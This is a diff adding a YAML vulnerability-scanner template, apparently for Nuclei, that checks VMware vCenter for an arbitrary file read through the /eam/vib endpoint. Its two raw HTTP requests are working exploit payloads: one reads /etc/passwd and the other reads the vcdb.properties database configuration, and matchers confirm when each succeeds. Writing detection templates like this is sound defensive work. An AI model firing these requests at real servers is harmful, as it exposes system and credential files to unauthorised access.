@@ -1,0 +1,41 @@
+id: vmware-vcenter-vib-readfile
+
+info:
+  name: VMware vCenter Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects arbitrary file read vulnerability in VMware vCenter by accessing specific files such as /etc/passwd or vcdb.properties.
+  reference:
+    - https://t.co/LfvbyBUhF5
+
+http:
+  - raw:
+      - |
+        GET /eam/vib?id=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:[x*]:0:0:"
+        part: body
+
+  - raw:
+      - |
+        GET /eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "org.postgresql.Driver"
+        part: body
